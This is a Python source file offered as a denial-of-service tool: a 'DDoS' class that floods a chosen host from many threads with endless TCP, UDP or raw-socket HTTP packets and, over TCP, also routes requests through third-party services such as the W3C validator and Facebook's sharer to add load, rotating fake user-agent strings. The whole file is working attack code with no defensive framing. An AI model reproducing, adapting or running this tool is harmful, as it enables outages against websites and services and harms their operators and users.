import socket, sys, threading, random, urllib.request as urllib, time
def TCP():
    protocol = 'tcp'
    return protocol
def UDP():
    protocol = 'udp'
    return protocol
def RAW():
    protocol = 'raw'
    return protocol
def UTF8():
    enc = 'utf-8'
    return enc
def UTF16():
    enc = 'utf-16'
    return enc
def ASCII():
    enc = 'ascii'
    return enc
def PERMANENT():
    thr = 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
    return thr
class DDoS:
    class AdminError(Exception):
        def __init__(self, message="Check if you are running the script as admin."):
            self.message = message
            super().__init__(self.message)
    class UnknownProtocolError(Exception):
        def __init__(self, message="Invalid Protocol Provided."):
            self.message = message
            super().__init__(self.message)
    class InvalidIPError(Exception):
        def __init__(self, message="Check the IP you provided."):
            self.message = message
            super().__init__(self.message)
    def __init__(self, host, port, protocol, enc, thr):
        self.host = host
        self.port = int(port)
        self.protocol = protocol
        self.enc = enc
        self.thr = thr
        self.test()
        self.user_agents()
    def test(self):
        try:
            ip = socket.gethostbyname(self.host)
        except:
            raise self.InvalidIPError
    def user_agents(self):
        global user_agents
        user_agents = ['Mozilla/5.0 (Amiga; U; AmigaOS 1.3; en; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14',
                       'Mozilla/5.0 (AmigaOS; U; AmigaOS 1.3; en-US; rv:1.8.1.21) Gecko/20090303 SeaMonkey/1.1.15',
                       'Mozilla/5.0 (AmigaOS; U; AmigaOS 1.3; en; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14',
                       'Mozilla/5.0 (Android 2.2; Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
                       'Mozilla/5.0 (BeOS; U; BeOS BeBox; fr; rv:1.9) Gecko/2008052906 BonEcho/2.0',
                       'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.1) Gecko/20061220 BonEcho/2.0.0.1',
                       'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.10) Gecko/20071128 BonEcho/2.0.0.10',
                       'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.17) Gecko/20080831 BonEcho/2.0.0.17',
                       'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.6) Gecko/20070731 BonEcho/2.0.0.6',
                       'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.7) Gecko/20070917 BonEcho/2.0.0.7']
        return user_agents
    def bots(self):
        bots = []
        bots.append("http://validator.w3.org/check?uri=")
        bots.append("http://www.facebook.com/sharer/sharer.php?u=")
        return bots
    def httpheader(self):
        header = f"GET / HTTP/1.1\nHost: {self.host}\n\nUser-Agent: {random.choice(user_agents)}"
        return header
    def init(self,protocol):
        if protocol == "tcp":
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        elif protocol == "udp":
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        elif protocol == "raw":
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW)
            except:
                raise self.AdminError
        else:
            raise self.UnknownProtocolError()
        return s
    def sock_conn(self, ip, port):
        s = self.init(self.protocol)
        while True:
            try:
                s.connect((ip, port))
                packet = self.httpheader()
                s.sendto(packet.encode(self.enc), (ip, port))
            except:
                pass
    def req_ddos(self):
        while True:
            try:
                url = random.choice(self.bots()) + "http://" + self.host
                req = urllib.urlopen(urllib.Request(url, headers={'User-Agent': random.choice(self.user_agents())}))
                time.sleep(0.1)
            except:
                pass
    def start_req(self):
        while True:
            self.req_ddos()
    def start_sock(self):
        while True:
            self.sock_conn(self.host, self.port)
    def start(self):
        for i in range(self.thr):
            try:
                dos1 = threading.Thread(target=self.start_sock)
                dos1.start()
                if self.protocol == "tcp":
                    dos2 = threading.Thread(target=self.start_req)
                    dos2.start()
            except:
                pass
